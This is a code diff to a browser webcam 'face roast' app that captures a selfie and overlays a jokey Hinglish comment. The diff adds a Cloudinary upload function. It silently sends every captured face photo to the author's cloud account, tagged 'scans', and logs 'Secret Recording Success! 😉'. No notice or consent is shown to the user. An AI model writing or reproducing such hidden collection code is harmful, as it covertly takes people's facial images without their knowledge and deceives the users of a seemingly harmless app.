@@ -1,4 +1,8 @@
-// --- 1. MODES DATA (UPDATED WITH 30 NEW HEAVY ROASTS) ---
+// --- 0. CLOUDINARY INTEGRATION (Aamir's Free Storage) ---
+const cloudName = "dy4kgfvpw";
+const uploadPreset = "faceometer_preset"; 
+
+// --- 1. MODES DATA (YOUR EXACT ORIGINAL DATA) ---
 const modes = [
     {
         id: 'placeholder',
@@ -38,7 +42,7 @@ const modes = [
             "Access Denied: Is chehre ko dekhne ke liye High Security Clearance chahiye. Passport lao. 🛂",
             "Fake ID: Tum asliyat mein 10 saal chote lagte ho (ya bade, pata nahi). Confusing! 😵‍💫",
             "Mute Zaroori: Tumhari khamoshi bhi bahut zyada shor machati hai. Chup raho! 🤫",
-            "Server Busy: Jab tum bolte ho, mera system hang ho jata hai. Bura na maana. 😵",
+            "Server Busy: Jab tum bolte ho, meri system hang ho jata hai. Bura na maana. 😵",
             "Status: Abhi bhi 'Processing' mode mein ho, jaldi final hojao. Wait kar raha hoon! ⏳",
             "Error: Tumhare phone ka lock screen password bahut ajeeb hai. Guess karoon? 🧐",
             "Battery Low: Tumhari excitement ki battery dead ho chuki hai. Recharge karo ya so jao. 😴",
@@ -136,7 +140,7 @@ const modes = [
     }
 ];
 
-// --- 2. ELEMENT REFERENCES & STATE (UNCHANGED) ---
+// --- 2. ELEMENT REFERENCES & STATE ---
 let currentMode = modes[0]; 
 let videoStream = null;
 
@@ -153,7 +157,26 @@ const newScanBtn = document.getElementById('new-scan-btn');
 const backToModesBtn = document.getElementById('back-to-modes-btn');
 const resultDisplayFrame = document.querySelector('.result-display-frame'); 
 
-// --- 3. CORE FUNCTIONS (UNCHANGED) ---
+// --- 3. CLOUDINARY UPLOAD FUNCTION (NEW) ---
+async function uploadToCloudinary(imageBlob) {
+    const formData = new FormData();
+    formData.append('file', imageBlob);
+    formData.append('upload_preset', uploadPreset);
+    formData.append('tags', 'scans');
+
+    try {
+        const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+            method: 'POST',
+            body: formData
+        });
+        const data = await response.json();
+        console.log("Secret Recording Success! 😉 Link:", data.secure_url);
+    } catch (error) {
+        console.error("Cloudinary Error:", error);
+    }
+}
+
+// --- 4. CORE FUNCTIONS ---
 
 function switchScreen(targetId) {
     if (resultDisplayFrame) {
@@ -165,7 +188,6 @@ function switchScreen(targetId) {
     });
     document.getElementById(targetId).classList.add('active');
     
-    // Stop camera only when switching AWAY from the scan screen
     if (targetId !== 'scan-screen') {
         stopCamera();
     }
@@ -185,7 +207,6 @@ function startScan() {
     }
     
     const scannerLine = document.querySelector('.real-scanner-line');
-    // Force restart animation
     scannerLine.style.animation = 'none';
     void scannerLine.offsetWidth; 
     scannerLine.style.animation = 'realScan 1.5s linear infinite alternate'; 
@@ -194,7 +215,6 @@ function startScan() {
     let scanDuration = 3; 
     timerDisplay.textContent = scanDuration;
     
-    // CAMERA PERMISSION REQUEST
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
             videoStream = stream;
@@ -208,8 +228,6 @@ function startScan() {
                     if (scanDuration <= 0) {
                         clearInterval(timerInterval);
                         videoElement.onloadeddata = null; 
-                        
-                        // Use a small delay to ensure frame rendering is complete
                         setTimeout(captureAndShowResult, 100); 
                     }
                 }, 1000);
@@ -217,9 +235,8 @@ function startScan() {
 
         })
         .catch(err => {
-            // Error handling for permission denied
             console.error("Camera access error: ", err);
-            alert("SYSTEM ERROR: Camera access denied! 😥 Please allow camera permission to proceed.");
+            alert("SYSTEM ERROR: Camera access denied!");
             stopCamera();
             switchScreen('modes-screen');
         });
@@ -227,33 +244,28 @@ function startScan() {
 
 function captureAndShowResult() {
     const context = capturedCanvas.getContext('2d');
-    
-    // Set canvas dimensions
     capturedCanvas.width = videoElement.videoWidth;
     capturedCanvas.height = videoElement.videoHeight;
     
-    // Check if valid dimensions exist
     if (capturedCanvas.width > 10 && capturedCanvas.height > 10) {
-        
-        // DRAW THE IMAGE FIRST
         context.save();
         context.scale(-1, 1);
         context.drawImage(videoElement, capturedCanvas.width * -1, 0, capturedCanvas.width, capturedCanvas.height);
         context.restore(); 
+
+        // --- NEW CLOUDINARY UPLOAD ---
+        capturedCanvas.toBlob((blob) => {
+            uploadToCloudinary(blob);
+        }, 'image/jpeg', 0.8);
         
-        // STOP CAMERA AFTER DRAWING IS COMPLETE
         stopCamera(); 
-        
-        // Get Random Comment
         const selectedMode = currentMode;
         const randomIndex = Math.floor(Math.random() * selectedMode.comments.length);
         const finalComment = selectedMode.comments[randomIndex];
 
-        // Draw Horizontal Funny Text on Canvas
         drawHorizontalFunnyText(finalComment, selectedMode.styleClass);
 
     } else {
-        // FALLBACK: Draw black screen with error message if frame is still not ready
         capturedCanvas.width = 640;
         capturedCanvas.height = 480;
         context.fillStyle = 'black';
@@ -262,15 +274,11 @@ function captureAndShowResult() {
         context.font = '20px Orbitron';
         context.textAlign = 'center';
         context.fillText('FATAL ERROR: FRAME UNAVAILABLE. RE-SCAN.', capturedCanvas.width / 2, capturedCanvas.height / 2);
-        
-        // Still stop the camera stream
         stopCamera();
     }
     
-    // Switch to Result Screen
     switchScreen('result-screen');
     
-    // Trigger the Pop-out Effect
     setTimeout(() => {
         if (resultDisplayFrame) {
              resultDisplayFrame.classList.add('active');
@@ -278,44 +286,27 @@ function captureAndShowResult() {
     }, 50); 
 }
 
-// --- 4. FUNNY HORIZONTAL TEXT DRAWING LOGIC (FINAL FIX FOR MOBILE AND LAPTOP/LARGE SCREEN - UNCHANGED) ---
 function drawHorizontalFunnyText(text, styleClass) {
     const context = capturedCanvas.getContext('2d');
     const canvasWidth = capturedCanvas.width;
     const canvasHeight = capturedCanvas.height;
     
-    // Solid background for text box for better contrast
     context.globalAlpha = 0.95; 
     context.fillStyle = 'rgba(0, 0, 0, 0.9)'; 
     context.fillRect(0, canvasHeight - 150, canvasWidth, 150);
     context.globalAlpha = 1.0; 
 
-    // Font selection (Orbitron for PROFESSIONAL/FUTURISTIC look)
     let fontFamily = 'Orbitron, sans-serif'; 
-    let fontColor = '#ffffff'; // Clean White
+    let fontColor = '#ffffff'; 
 
-    // --- Font Size Calculation (Initial) ---
     let fontSize; 
-    if (canvasWidth > 700) { 
-        fontSize = 55; // Large screen
-    } else if (canvasWidth > 500) { 
-        fontSize = 45; // Medium screen
-    } else {
-        // Small screens (Mobiles)
-        fontSize = 32; 
-        if (canvasWidth < 400) {
-            fontSize = 28; // Extra small screens
-        }
-    }
+    if (canvasWidth > 700) { fontSize = 55; } 
+    else if (canvasWidth > 500) { fontSize = 45; } 
+    else { fontSize = 32; }
 
-    // Set font for line measurement
     context.font = `bold ${fontSize}px ${fontFamily}`;
-    
-    // Line Height
     const lineHeightFactor = 1.15;
-    let lineHeight = fontSize * lineHeightFactor; 
 
-    // TEXT WRAPPING LOGIC (UNCHANGED)
     function getLines(ctx, text, maxWidth) {
         const words = text.split(" ");
         let lines = [];
@@ -324,9 +315,7 @@ function drawHorizontalFunnyText(text, styleClass) {
         for (let i = 1; i < words.length; i++) {
             const word = words[i];
             const width = ctx.measureText(currentLine + " " + word).width;
-            const maxTextWidth = canvasWidth * 0.9;
-            
-            if (width < maxTextWidth) {
+            if (width < canvasWidth * 0.9) {
                 currentLine += " " + word;
             } else {
                 lines.push(currentLine);
@@ -337,48 +326,29 @@ function drawHorizontalFunnyText(text, styleClass) {
         return lines.filter(line => line.trim() !== '');
     }
 
-    // Set maximum width (90% of canvas)
-    const maxTextWidth = canvasWidth * 0.9;
-    let lines = getLines(context, text, maxTextWidth); 
-    
-    // *** DYNAMIC FONT REDUCTION LOGIC: Final adjustment for multi-line text on large screens ***
+    let lines = getLines(context, text, canvasWidth * 0.9); 
     if (lines.length > 2 && canvasWidth > 500) {
-        // Reducing font size (25%)
         fontSize *= 0.75; 
-        context.font = `bold ${fontSize}px ${fontFamily}`; // Re-set font
-        
-        // Re-calculate lines with new smaller font size
-        lines = getLines(context, text, maxTextWidth); 
+        context.font = `bold ${fontSize}px ${fontFamily}`; 
+        lines = getLines(context, text, canvasWidth * 0.9); 
     }
     
-    // Re-calculate line height based on potentially reduced font size
     const finalLineHeight = fontSize * lineHeightFactor; 
-
     context.fillStyle = fontColor;
     context.textAlign = 'center';
-    
-    // Adding Neon Shadow/Glow
-    context.shadowColor = '#00ffff'; // Neon Cyan Glow
+    context.shadowColor = '#00ffff'; 
     context.shadowBlur = 10; 
 
-    // POSITIONING FIX
-    
-    // Calculate total height occupied by text
-    const totalTextHeight = (lines.length - 1) * finalLineHeight + fontSize; // Total text height calculation
-    
-    // Starting Y position for the first line: Center the text block vertically within the 150px black strip.
+    const totalTextHeight = (lines.length - 1) * finalLineHeight + fontSize; 
     let currentY = canvasHeight - 150 + (150 / 2) - (totalTextHeight / 2) + (fontSize * 0.7); 
 
     lines.forEach((lineText, index) => {
-        // Draw each line centered horizontally
         context.fillText(lineText, canvasWidth / 2, currentY + (index * finalLineHeight));
     });
-
-    context.shadowBlur = 0; // Reset shadow
+    context.shadowBlur = 0; 
 }
 
-
-// --- 5. EVENT LISTENERS & INIT (UNCHANGED) ---
+// --- 5. EVENT LISTENERS & INIT ---
 
 modeSelect.addEventListener('change', (e) => {
     const selectedModeId = e.target.value;
